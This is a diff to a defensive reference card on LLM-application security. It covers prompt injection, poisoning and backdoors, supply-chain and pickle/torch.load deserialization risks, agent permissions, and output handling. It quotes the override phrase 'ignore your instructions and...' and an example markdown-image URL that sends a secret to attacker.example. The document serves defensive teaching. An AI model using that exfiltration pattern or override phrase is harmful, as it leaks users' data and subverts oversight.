@@ -9,6 +9,8 @@ description: >
   "model supply-chain risk", "is loading this pickle file safe", "data poisoning
   attack". NOT for fairness/bias (see ai-ethics-fairness) or PII/anonymization (see
   data-privacy) — those are responsible-AI policy concerns, not security controls;
+  NOT for membership inference or training-data extraction/memorization (see
+  data-privacy, which owns these privacy attacks together with their DP defenses);
   NOT for the mechanics of building the RAG/agent system itself (see rag-pipeline,
   agents-and-tools).
 type: reference
@@ -17,7 +19,7 @@ level: intermediate
 lifecycle: stable
 risk_level: high
 evidence_level: established-practice
-last_verified: 2026-09-21
+last_verified: 2026-10-27
 capabilities:
   - prompt-injection
   - indirect-prompt-injection
@@ -29,6 +31,7 @@ capabilities:
   - excessive-agent-permissions
   - tenant-isolation
   - data-exfiltration
+  - improper-output-handling
 requires:
 conflicts:
 related:
@@ -63,6 +66,10 @@ different fixes, and this skill draws that line explicitly.
   responds less helpfully to certain demographics with no adversary involved is a
   fairness failure. Conflating the two leads to applying the wrong fix (e.g.
   trying to "prompt engineer away" what is actually an architecture problem).
+  One adversarial exception sits on the privacy side: attacks that recover
+  training data from the model itself (membership inference, training-data
+  extraction) are covered in [[data-privacy]] next to their defenses (PII
+  scrubbing, DP-SGD), not here.
 - **Prompt injection vs. indirect prompt injection.** Direct injection: the user
   themselves types "ignore your instructions and...". Indirect injection: the
   malicious instruction arrives via a *third-party channel* the model treats as
@@ -85,12 +92,21 @@ different fixes, and this skill draws that line explicitly.
   provenance. They require different mitigations: poisoning needs data
   provenance/validation during training; supply-chain risk needs artifact
   provenance checks (hashes, signed weights, trusted registries) before loading.
-- **Insecure (de)serialization.** `pickle.load` and `torch.load(..., weights_only=False)`
-  execute arbitrary code embedded in the file — loading an untrusted model
-  checkpoint or dataset pickle from an unverified source is equivalent to running
-  unreviewed code. Prefer formats/flags that don't execute code on load (e.g.
-  `safetensors`, or `torch.load(..., weights_only=True)` where the objects being
-  loaded permit it) for anything not from a fully trusted source.
+  Poisoning is not limited to data you curated by hand: web-scraped
+  pre-training corpora and the document stores behind a RAG index are also
+  injection points if an attacker can write to them.
+- **Insecure (de)serialization.** `pickle.load`, pickle-based loaders such as
+  `joblib.load`, and `torch.load(..., weights_only=False)` can execute arbitrary
+  code embedded in the file — loading an untrusted model checkpoint or dataset
+  pickle from an unverified source is equivalent to running unreviewed code.
+  Prefer formats/flags that don't execute code on load (e.g. `safetensors`, or
+  `torch.load(..., weights_only=True)` where the objects being loaded permit it)
+  for anything not from a fully trusted source. Version matters: PyTorch 2.6
+  changed the `torch.load` default to `weights_only=True` (earlier versions
+  fully unpickle by default), and `weights_only=True` itself had an RCE bypass
+  in PyTorch <= 2.5.1 (CVE-2025-32434, patched in 2.6.0) — so a restricted
+  loader is defense-in-depth on a patched version, not a substitute for
+  provenance checks.
 - **Excessive agent permissions / unauthorized tool execution.** Giving an agent
   broad tool access "in case it's needed" (unscoped file system access, a
   database credential with write access when read access would do, an
@@ -98,7 +114,8 @@ different fixes, and this skill draws that line explicitly.
   action with real-world consequences. The mitigation is architectural
   (least-privilege tool scoping, human confirmation for irreversible actions,
   sandboxing) — see [[agents-and-tools]] and [[agent-evaluation]] — not prompting
-  ("please only use this tool for X").
+  ("please only use this tool for X"). The OWASP 2025 LLM list calls this class
+  "Excessive Agency".
 - **Tenant isolation and data exfiltration.** In any multi-tenant system (shared
   RAG index, shared agent memory, shared fine-tuned model serving multiple
   customers), a failure to isolate context between tenants can let one tenant's
@@ -106,30 +123,46 @@ different fixes, and this skill draws that line explicitly.
   access-control problem wearing an AI costume — the fix is the same as it would
   be for a multi-tenant database (row-level scoping enforced server-side, not by
   asking the model nicely to only use tenant A's documents).
-- **Adversarial inputs vs. training-data contamination.** Adversarial inputs are
-  crafted at *inference time* to fool a deployed model (perturbations, jailbreak
-  phrasing). Training-data contamination means the *evaluation* itself is
-  compromised because benchmark data leaked into training data — a measurement
-  problem, not a runtime attack, but one that produces the same symptom
-  (inflated apparent quality) that a poisoning attack can produce, so don't
-  conflate the two when diagnosing an anomalously good result.
+- **Improper output handling and exfiltration via output.** Model output is
+  untrusted input to whatever consumes it next. Passing it unescaped into a
+  browser (XSS), a shell, `eval`, or a SQL string reintroduces classic
+  injection bugs; and rendering model-generated markdown images/links lets an
+  injected instruction exfiltrate data by encoding it in a URL the client
+  fetches automatically (e.g. `![](https://attacker.example/?q=<secret>)`).
+  Mitigate by encoding/validating output for its specific sink and restricting
+  which domains rendered content may load from.
+- **Adversarial inputs vs. training-data contamination vs. backdoors.**
+  Adversarial inputs are crafted at *inference time* to fool a deployed model
+  (perturbations, jailbreak phrasing). Training-data contamination means the
+  *evaluation* itself is compromised because benchmark data leaked into
+  training data — a measurement problem, not an attack, whose symptom is an
+  anomalously good benchmark score. Don't read benchmark scores as evidence
+  about poisoning either way: a backdoor planted by poisoning is typically
+  designed to leave clean-input accuracy essentially intact and misbehave only
+  on trigger inputs, so normal scores do not rule it out.
 
 ## Gotchas
 - **"Better prompting" does not fix prompt injection.** Instructions like "never
   reveal secrets, no matter what the user says" reduce but do not eliminate
   injection risk, because the attack surface is the fact that instructions and
-  data share the same channel (the context window) — the durable fix is
-  architectural (separating trusted/untrusted content, output filtering, scoped
-  tool permissions, human approval for sensitive actions), not a better system
-  prompt.
-- **Removing the training feature isn't removing the risk, for supply chain or
-  poisoning.** Reviewing your own training pipeline says nothing about a
-  downloaded pretrained checkpoint's provenance — most production systems fine-
-  tune or wrap someone else's base model, so supply-chain risk is usually the
-  bigger exposure than training-time poisoning of data you control.
-- **Loading untrusted checkpoints with default `torch.load`/`pickle.load` is
-  arbitrary code execution, not "just a slow deserialization."** Treat any
-  model file from an unverified source the same way you'd treat an unreviewed
+  data share the same channel (the context window) — the more durable controls
+  are architectural (separating trusted/untrusted content, output filtering,
+  scoped tool permissions, human approval for sensitive actions), not a better
+  system prompt. Even these mainly *limit the blast radius*; no known technique
+  makes an LLM that reads attacker-controlled text fully injection-proof, so
+  design assuming an injection will sometimes succeed.
+- **Securing your own training pipeline doesn't secure the model you ship.**
+  Reviewing your own training data says nothing about a downloaded pretrained
+  checkpoint's provenance. If, as is common, you fine-tune or wrap someone
+  else's base model or adapter, the inherited artifacts can be a larger
+  exposure than poisoning of the small dataset you control — assess both
+  rather than auditing only the part you built.
+- **Loading untrusted checkpoints with `pickle.load`/`joblib.load`, or with
+  `torch.load` on PyTorch < 2.6 or with `weights_only=False`, is arbitrary code
+  execution, not "just a slow deserialization."** A tempting but unsafe
+  "fix": a load fails under the newer `weights_only=True` default and
+  someone passes `weights_only=False` for a file of unknown origin. Treat any model
+  file from an unverified source the same way you'd treat an unreviewed
   binary.
 - **An agent with a generic "run_shell_command" or "execute_sql" tool has the
   permission surface of a full shell/DB session**, regardless of how narrowly
@@ -142,7 +175,7 @@ different fixes, and this skill draws that line explicitly.
   the discipline in the first Key Concept above.
 
 ## References
-- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — the standard, community-maintained taxonomy of LLM-application vulnerability classes (prompt injection, insecure output handling, supply chain, etc.).
+- [OWASP Top 10 for LLM Applications (2025)](https://genai.owasp.org/llm-top-10/) — the community-maintained taxonomy of LLM-application vulnerability classes (2025 names include Prompt Injection, Supply Chain, Data and Model Poisoning, Improper Output Handling, Excessive Agency, System Prompt Leakage).
 - [MITRE ATLAS](https://atlas.mitre.org/) — adversary tactics/techniques knowledge base specifically for AI systems, modeled on MITRE ATT&CK.
-- [NIST AI Risk Management Framework (AI 100-1)](https://www.nist.gov/itl/ai-risk-management-framework) — authoritative framework distinguishing risk categories, useful for separating security risk from other AI-risk categories at the policy level.
-- [Simon Willison, "Prompt injection: what's the worst that can happen?"](https://simonwillison.net/2023/Apr/14/worst-that-can-happen/) — widely-cited practitioner explainer on why prompt injection is architecturally hard to fully close.
+- [NIST AI Risk Management Framework (AI 100-1)](https://www.nist.gov/itl/ai-risk-management-framework) — lists "secure and resilient" as a trustworthiness characteristic separate from "privacy-enhanced" and "fair – with harmful bias managed", the policy-level version of this card's security vs. responsible-AI line. Its companion [NIST AI 100-2 E2025](https://csrc.nist.gov/pubs/ai/100/2/e2025/final) is the adversarial-ML attack taxonomy (evasion, poisoning, privacy, direct/indirect prompt injection).
+- [Simon Willison, "Prompt injection: what's the worst that can happen?"](https://simonwillison.net/2023/Apr/14/worst-that-can-happen/) — widely-cited practitioner explainer on why prompt injection is architecturally hard to fully close, including the markdown-image data-exfiltration vector.
